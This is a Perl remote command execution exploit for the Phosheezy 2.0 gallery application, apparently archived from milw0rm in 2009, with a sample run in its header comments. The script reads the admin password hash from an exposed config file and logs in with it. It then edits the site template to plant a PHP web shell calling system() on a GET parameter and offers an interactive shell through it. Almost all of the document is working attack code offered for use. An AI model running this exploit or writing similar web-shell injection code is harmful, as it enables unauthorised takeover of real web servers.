#!/usr/bin/perl

# phosheezy 2.0
# http://www.ryneezy.net/apps/phosheezy/phosheezy-v0.2.tar.gz
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org
# Greets: r00t, x0r, jay, BlackLight
# lol at athos

# --------------------------------------------------------------
# Exploit in action :D
# --------------------------------------------------------------
# osirys[~]>$ perl exp.txt http://localhost/phosheezy/
#
#   ----------------------------
#      Phosheezy RCE Exploit
#         Coded by Osirys
#   ----------------------------
#
# [+] Admin password found:
#     Sha1 pwd: 8942c747dc48c47a6f7f026df85a448046348a2c
# [+] Grabbing server headers to get a valid SESSION ID ..
# [+] SESSION ID grabbed: 3srqiuh8jrttt73tbd7j5uvhi2
# [+] Succesfully logged in as Administrator
# [+] Template edited, RCE Vulnerability Created !
# shell$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell$> exit
# [-] Quitting ..
# osirys[~]>$
# --------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $host       =  $ARGV[0];
my $pwd_path   =  "/config/password";
my $adm_path   =  "/admin.php";
my $templ_path =  "/admin.php?action=3";

help("-1") unless ($host);
cheek($host) == 1 || help("-2");
&banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $url = $host.$pwd_path;
my $re = get_req($url);

if ($re =~ /([0-9a-f]{40})/) {
    $password = $1;
    print "[+] Admin password found:\n";
    print "    Sha1 pwd: $password  \n";
    adm_log($password);
}
else {
    print "[-] Unable to get sha1 Admin password\n\n";
    exit(0);
}

sub adm_log() {
    my $password =  $_[0];
    my $link     =  $path.".".$adm_path;
    my $post     =  "password=$password&Login=Login";
    my $length   =  length($post);
    my @data;
    my $socket   =  new IO::Socket::INET(
                                          PeerAddr => $h0st,
                                          PeerPort => '80',
                                          Proto    => 'tcp',
                                        ) or die $!;

    my $data = "POST ".$link." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $post."\r\n";

    $socket->send($data);
    print "[+] Grabbing server headers to get a valid SESSION ID ..\n";

    while (my $e = <$socket>) {
        push(@data,$e);
    }
    foreach my $e(@data) {
        if ($e =~ /Welcome to Ryneezy PhoSheezy web administration/) {
            $log_ = 1;
            print "[+] Succesfully logged in as Administrator\n";
        }
        elsif ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
            $phpsessid = $1;
            print "[+] SESSION ID grabbed: $phpsessid\n";
        }
    }

    (($log_)&&($phpsessid)) || die "[-] Exploit failed -> Login Failed or SESSION ID not grabbed!\n";
    RCE_create($phpsessid);
}

sub RCE_create() {
    my $phpsessid = $_[0];
    my $link     =  $path.".".$templ_path;
    my $code = "header=<html><head><title>Ryneezy PhoSheezy</tit".
               "le></head><body bgcolor=\"#ffffff\" text=\"#0000".
               "00\">&footer=</body></html><!-- cmd --><?php sys".
               "tem(\$_GET[cmd]);?><!--cmd-->&Submit=Edit Layout";
    my $length =  length($code);

    my $socket = new IO::Socket::INET(
                                       PeerAddr => $h0st,
                                       PeerPort => '80',
                                       Proto    => 'tcp',
                                     ) or die $!;

    my $data = "POST ".$link." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Cookie: PHPSESSID=".$phpsessid."; hotlog=1\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               "$code\r\n";

    $socket->send($data);

    while (my $e = <$socket>) {
        if ($e =~ /Edit layout again/) {
            $rce_c = 1;
            print "[+] Template edited, RCE Vulnerability Created !\n";
        }
    }

    $rce_c == 1 || die "[-] Can't edit Template. Exploit failed\n\n";
    &exec_cmd;
}

sub exec_cmd {
    print "shell\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = ($host."/index.php?cmd=".$cmd);
    $re = get_req($exec_url);
    if ($re =~ /<!-- cmd -->(.*)/) {
        my $cmd = $1;
        $cmd =~ s/<!--cmd-->/[-] Undefined output or bad cmd !/;
        print "$cmd\n";
        &exec_cmd;
    }
    else {
        print "[-] Undefined output or bad cmd !\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "     Phosheezy RCE Exploit     \n".
          "        Coded by Osirys        \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Cheek that you provide a hostname address!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-01-14]